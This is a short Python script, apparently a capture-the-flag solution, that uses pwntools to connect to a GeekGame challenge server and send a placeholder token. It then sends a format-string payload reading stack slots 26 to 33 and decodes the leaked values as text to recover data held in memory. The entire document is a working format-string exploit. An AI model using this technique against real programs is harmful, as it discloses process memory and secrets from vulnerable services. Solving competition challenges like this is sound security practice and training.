from pwn import *
import struct

conn = connect("prob09.geekgame.pku.edu.cn", "10009")
conn.recvuntil(b"Please input your token: ")
conn.send(b"MY TOKEN\n")
conn.recvuntil(b'Please input your instruction:\n')
conn.sendline(b'%26$p %27$p %28$p %29$p %30$p %31$p %32$p %33$p')
line = conn.recvline().decode("utf8", "ignore").strip("\n")
line_bytes = struct.pack("<8Q", *[int(x[2:], 16) if x != "(nil)" else 0 for x in line.split(" ")])
print(line_bytes.decode("utf8", "ignore"))
conn.close()